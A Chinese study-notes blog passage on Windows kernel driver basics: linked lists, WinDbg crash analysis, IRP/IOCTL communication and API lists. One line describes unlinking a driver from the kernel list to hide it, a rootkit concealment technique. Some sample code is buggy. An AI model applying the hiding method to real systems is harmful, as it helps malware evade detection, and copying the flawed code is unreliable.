class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg)</span> &#123;</span><br><span class="line">DbgBreakPoint();</span><br><span class="line">DbgPrintEx(<span class="number">77</span>,<span class="number">0</span>,<span class="string">&quot;---------hello world------------------\r\n&quot;</span>);</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vNvpq">链表</h2><h3 id="ENw2H">练习</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">xxx</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xxx</span>* <span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xxx</span>* <span class="title">last</span>;</span></span><br><span class="line">INT x;</span><br><span class="line">&#125;XXX, * PXXX;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg)</span> &#123;</span><br><span class="line">DbgBreakPoint();</span><br><span class="line"></span><br><span class="line">XXX head;</span><br><span class="line">XXX x1;</span><br><span class="line">XXX x2;</span><br><span class="line">x1.x = <span class="number">0x10</span>;</span><br><span class="line">x2.x = <span class="number">0x20</span>;</span><br><span class="line">InitializeListHead(&amp;head);</span><br><span class="line">InitializeListHead(&amp;x1);</span><br><span class="line">InitializeListHead(&amp;x2);</span><br><span class="line"></span><br><span class="line">InsertTailList(&amp;head, &amp;x1);</span><br><span class="line">InsertTailList(&amp;head, &amp;x2);</span><br><span class="line"></span><br><span class="line">PLIST_ENTRY Tmp = &amp;head;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">Tmp = Tmp-&gt;Blink;</span><br><span class="line">XXX temp = *(PXXX)Tmp;</span><br><span class="line"><span class="keyword">if</span> (temp.x == <span class="number">0x20</span>) &#123;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;find 0x20&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (Tmp != &amp;head);</span><br><span class="line"></span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BT1u6">断链</h3>看懂了，但是感觉写起来很复杂，就是模拟了驱动所在的链表，可以通过链表找到想要断链隐藏的驱动（如果是自身的话要等后续内核对自己的调用结束之后，再断链，可以用休眠的api）<h2 id="aXAtC">蓝屏分析</h2><h3 id="m03yR">练习</h3>首先windbg支持tab自动补全，当蓝屏触发时，可以用!analyze -v指令来查看蓝屏信息，那么我们以该程序测试，这个给0地址赋值包崩溃的<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg)</span> &#123;</span><br><span class="line">    INT* a = <span class="number">0</span>;</span><br><span class="line">    *a = <span class="number">100</span>;</span><br><span class="line">    pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>蓝屏通知：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Fail to read system\currentcontrolset\services\Lmhosts\Parameters\EnableUserMode, error=2</span><br><span class="line"></span><br><span class="line">*** Fatal System Error: 0x0000007e</span><br><span class="line">                       (0xC0000005,0xA4B9D00E,0x807F98FC,0x807F9360)</span><br><span class="line"></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line"></span><br><span class="line">A fatal system error has occurred.</span><br><span class="line">Debugger entered on first try; Bugcheck callbacks have not been invoked.</span><br><span class="line"></span><br><span class="line">A fatal system error has occurred.</span><br><span class="line"></span><br><span class="line">For analysis of this file, run !analyze -v</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">83eb61bc cc              int     3</span><br></pre></td></tr></table></figure><p>可以看到这里他提示我!analyze了，那我们输入进入</p><p>…跳转io通信里的蓝屏</p><h3 id="iAczV">存放地址</h3>默认蓝屏信息存放地址：`C:\Windows\Minidump`<h2 id="wYLi5">IO通信</h2>驱动对象->设备对象<----R0某个函数里 打包成irp------r3能根据名字查找到设备，并且返回一个操作句柄 <h3 id="hMa2g">蓝屏分析中...补药蓝屏口牙┭┮﹏┭┮，但是有意外发生了，他蓝屏了，接上文!an...分析一下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">FAULTING_SOURCE_CODE:  </span><br><span class="line">    65:     RtlInitUnicodeString(&amp;pdsym, DRIVER_SYM);</span><br><span class="line">    66: </span><br><span class="line">    67:     //?????? ???¡§?¨¨¡À????¨®</span><br><span class="line">    68:     PDRIVER_OBJECT pDevice = NULL;</span><br><span class="line">&gt;   69:     NTSTATUS st = IoCreateDevice(pDriver, 0, &amp;pdname, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, pDevice);</span><br><span class="line">    70: </span><br><span class="line">    71:     if (NT_SUCCESS(st)) </span><br><span class="line">    72:     &#123;</span><br><span class="line">    73:         return STATUS_UNSUCCESSFUL;</span><br><span class="line">    74:     &#125;</span><br></pre></td></tr></table></figure><p>可以看到问题所在，IoCreateDevice</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nt!memcpy+0x33:</span><br><span class="line">83e76de3 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</span><br></pre></td></tr></table></figure><p>再次观察发现是memcpy中赋值出现问题，后面求助ai知道，是pDriver传入的应该是&amp;pDriver好吧。。。，那确实memcpy用到两个指针可能出现问题，最后找到问题了，前面的PUNICODE_STRING 是指针类型，要用UNICODE_STRING，后面就是简单的问题了，学到了可以dd st来查看报错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">L&quot;\\device\\myiotest&quot;</span></span></span><br><span class="line"><span class="comment">// Ring3用CreateFile打开设备时，用&quot;\\\\.\\MyTestDriver&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOLICLINK_NAME <span class="string">L&quot;\\??\\myiotest&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0-2047是保留的  2048~4095</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OPER2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING SymbolicLinkName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">DbgPrint(<span class="string">&quot;驱动程序停止运行了 . \r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除符号链接 删除设备</span></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME);</span><br><span class="line">IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_CREATE处理函数</span></span><br><span class="line">NTSTATUS <span class="title function_">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DispatchCreate ... \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回状态如果不设置 Ring3返回的是失败</span></span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_CLOSE处理函数</span></span><br><span class="line">NTSTATUS <span class="title function_">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DispatchClose ... \n&quot;</span>);</span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_DEVICE_CONTROL处理函数 用来处理与Ring3交互</span></span><br><span class="line">NTSTATUS <span class="title function_">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line">PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">ULONG uIoControlCode;</span><br><span class="line">PVOID pIoBuffer;</span><br><span class="line">ULONG uInLength;</span><br><span class="line">ULONG uOutLength;</span><br><span class="line">ULONG uRead;</span><br><span class="line">ULONG uWrite;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置临时变量的值</span></span><br><span class="line">pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line"><span class="comment">// 获取控制码</span></span><br><span class="line">uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line"><span class="comment">// 获取缓冲区地址(输入和输出的缓冲区都是一个)</span></span><br><span class="line">pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line"><span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line"><span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> OPER1:</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER1 ... \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">status = STATUS_SUCCESS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> OPER2:</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 接收字节数：%d \n&quot;</span>, uInLength);</span><br><span class="line">DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 输出字节数：%d \n&quot;</span>, uOutLength);</span><br><span class="line"><span class="comment">// Read From Buffer</span></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;uRead, pIoBuffer, <span class="number">4</span>);</span><br><span class="line">DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 ... %x \n&quot;</span>, uRead);</span><br><span class="line"><span class="comment">// Write To Buffer</span></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;pIoBuffer, &amp;uRead, <span class="number">4</span>);</span><br><span class="line"><span class="comment">// Set Status</span></span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">2</span>;</span><br><span class="line">status = STATUS_SUCCESS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置返回状态</span></span><br><span class="line">pIrp-&gt;IoStatus.Status = status;</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数 相当于Main函数</span></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS status = <span class="number">0</span>;</span><br><span class="line">ULONG    uIndex = <span class="number">0</span>;</span><br><span class="line">PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>;</span><br><span class="line">UNICODE_STRING Devicename;</span><br><span class="line">UNICODE_STRING SymbolicLinkName;</span><br><span class="line"></span><br><span class="line">DbgPrint(<span class="string">&quot;驱动程序开始运行了 . \r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建设备名称</span></span><br><span class="line">RtlInitUnicodeString(&amp;Devicename, DEVICE_NAME);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建设备</span></span><br><span class="line">status = IoCreateDevice(pDriver, <span class="number">0</span>, &amp;Devicename,</span><br><span class="line">FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDeviceObj);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;创建设备失败! \r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置交互数据的方式</span></span><br><span class="line">pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建符号链接名称</span></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建符号链接</span></span><br><span class="line">status = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;Devicename);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;创建符号链接失败! \r\n&quot;</span>);</span><br><span class="line">IoDeleteDevice(pDeviceObj);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置分发函数和卸载函数</span></span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目前卸载还存在问题</p><h3 id="OuJdu">简单通信代码模板</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DRIVER_SYM <span class="string">L&quot;\\??\\myiotest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MYDEVICE_OPERATION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hDevice = CreateFile(_DRIVER_SYM, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开设备失败 error:%d \r\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">ULONG x = <span class="number">0</span>;</span><br><span class="line">ULONG retlen = <span class="number">0</span>;</span><br><span class="line">BOOL isS = DeviceIoControl(hDevice, IOCTL_MYDEVICE_OPERATION,</span><br><span class="line">&amp;x, <span class="keyword">sizeof</span>(x),</span><br><span class="line">&amp;x, <span class="keyword">sizeof</span>(x),</span><br><span class="line">&amp;retlen, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;result %d ,%d\r\n&quot;</span>, isS, GetLastError());</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MIOoL">Io符号链接</h3>符号链接：<p>符号链接中用的前缀也就是\??也可以用\\.或者\dosDevice\来代替</p><h2 id="tzQJk">api合集</h2><h3 id="WPYNZ">字符串篇</h3>`RtlInitAnsiString` ANSI_STRING初始化<p><code>RtlInitUnicodeString(&amp;target,Name_value)</code>UNICODE_STRING初始化</p><p><code>RtlAnsiStringToUnicodeString</code> 宽窄字符转换</p><p><code>RtlFreeUnicodeString</code> UNICODE_STRING释放</p><h3 id="gnuFw">链表篇</h3>PLIST_ENTRY定义<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p><code>InitializeListHead(a1);</code>a1初始化：<br><code>InsertHeadList(a1,a2);</code>a2插入a1头部中：</p><p><code>InsertTailList(a1,a2);</code>a2插入a1尾部中：</p><p><code>RemoveEntryList(a2);</code>a2删除</p><p><code>RemoveHeadList(a2);</code>&#x2F;&#x2F;一般不用</p><h3 id="CU1q0">Io篇</h3>`IoCreateDevice();`函数参数比较长，对应着定义慢慢填吧<p><code>IoCreateSymbolicLink(a1,a2);</code>符号链接，a2生成快捷方式a1</p><p><code>IoDeleteDevice(pDevice);</code>删除对象</p><p><code>IoDeleteSymbolicLink(a1);</code>删除符号链接</p><p><code>IoCompleteRequest(a1,a2);</code>a2是0，a1是Irp，还没有学到，根据名字猜测是完成请求Irp可能是请求</p><h2 id="qeiFm">windbg的一些指令</h2>`!analyze -v` 查看蓝屏相关信息<p><code>k</code>查看堆栈调用</p><p><code>kv</code>查看堆栈调用详情</p><p><code>?? Driver-&gt;Object</code>可以查看设备对象详情</p><p><code>!object Object_Addr</code>可以查看设备地址</p><p><code>dt 链表名 下一个/上一个链表地址</code>即可看结构</p><p><code>dt</code>这个指令可用于看很多种结构，并且dt xxx -r1可以深入看结构下的几层结构</p><p><code>bp</code>手动下断点（好用！！）</p><p><code>u</code>查看目标地址字节码</p><h2 id="Kagu6">Irp相关参数</h2><h3 id="g4lHO">Irp</h3>`dt pIrp`首先查看Irp<p><code>-r1</code>展开AssociatedIrp ，通信函数传来的第二个参数在该部分SystemBuffer中</p><p><code>pIrp-&gt;AssociatedIrp.SystemBuffer</code></p><p>紧接着<code>-r1</code>展开Tail<code>-r2</code>展开Overlay，获得存储的结构体CurrentStackLocation</p><h3 id="PaXQg">CurrentStackLocation</h3>如果用Irp来调用到这里`pIrp->Tail.Overlay.CurrentStackLocation->`基础是这样很冗杂<p>可以用函数</p><p><code>dt  0x876a8c40 _IO_STACK_LOCATION</code>查看相关参数，MajorFunction是回调函数序号</p><p><code>pIrp-&gt;Tail.Overlay.CurrentStackLocation-&gt;MajorFunction</code></p><p><code>-r1</code>展开Parameters找到DeviceIoControl<code>-r2</code>展开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+0x000 DeviceIoControl  : &lt;unnamed-tag&gt;</span><br><span class="line">+0x000 OutputBufferLength : 4</span><br><span class="line">+0x004 InputBufferLength : 4</span><br><span class="line">+0x008 IoControlCode    : 0</span><br><span class="line">+0x00c Type3InputBuffer : (null) </span><br></pre></td></tr></table></figure><p>获得相关参数，改变通信代码来查看对应参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ULONG x1 = <span class="number">10</span>;</span><br><span class="line">ULONG64 x2 = <span class="number">20</span>;</span><br><span class="line">ULONG retlen = <span class="number">0</span>;</span><br><span class="line">BOOL isS = DeviceIoControl(hDevice, <span class="number">1</span>,</span><br><span class="line">                                   &amp;x1, <span class="keyword">sizeof</span>(x1),</span><br><span class="line">                                   &amp;x2, <span class="keyword">sizeof</span>(x2),</span><br><span class="line">                                   &amp;retlen, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>改变传参再次查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 